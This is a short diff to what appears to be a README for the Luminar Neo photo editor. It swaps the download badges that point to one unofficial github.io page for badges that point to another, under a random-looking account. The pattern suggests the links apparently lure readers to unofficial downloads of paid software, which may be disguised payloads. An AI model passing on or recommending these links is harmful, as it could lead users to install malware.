@@ -5,10 +5,8 @@
 </div>  
 <br>
 
-<div align="center">
+[![GET Luminar Neo](https://img.shields.io/badge/GET%20%E2%80%94%20Luminar-Neo-0078D6?style=for-the-badge&logoColor=white)](https://arihhz26254.github.io/.github/Luminar-Neo)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://luminar-neo-windows-toolkit.github.io/.github/)
-</div>
 
 ---
 
@@ -25,10 +23,7 @@
 <img src="https://media.macphun.com/img/uploads/customer/blog/1697811820/169781216465328ec4f05b99.19198742.png?q=85&w=1680" width="800">
 </div>
 
-<div align="center">
-
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://luminar-neo-windows-toolkit.github.io/.github/)
-</div>
+[![GET Luminar Neo](https://img.shields.io/badge/GET%20%E2%80%94%20Luminar-Neo-0078D6?style=for-the-badge&logoColor=white)](https://arihhz26254.github.io/.github/Luminar-Neo)
 
 ---
 
